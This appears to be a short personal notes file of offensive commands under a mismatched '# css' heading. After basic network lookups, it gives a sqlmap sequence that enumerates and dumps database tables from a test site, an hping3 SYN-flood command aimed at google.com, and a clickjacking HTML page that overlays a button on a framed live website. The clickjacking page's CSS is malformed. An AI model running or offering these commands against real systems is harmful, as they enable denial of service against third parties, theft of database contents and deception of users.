# css

ping -c 5 1.1.1.1
whois example.com
nslookup example.com
traceroute 8.8.8.8
ifconfig

sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --dbs
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart --tables
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T carts --columns
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T carts -C item --dump

sudo apt-get -y install hping3
sudo hping3 -S --flood -V -p 80 google.com

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clickjacking</title>
</head>
<style>
    iframe{
        opacity: 0.1;
    }
    button	        position: absolute;
        top: 485px;
        left: 175px;
    }
</style>
<body>
    <h2>Clickjacking Demo Page (iframe)</h2><br/>
    <iframe src="https://study-notion-frontend-wheat.vercel.app/" height="500px" width="500px"></iframe>
    <button>click me </button>
</body>
</html>
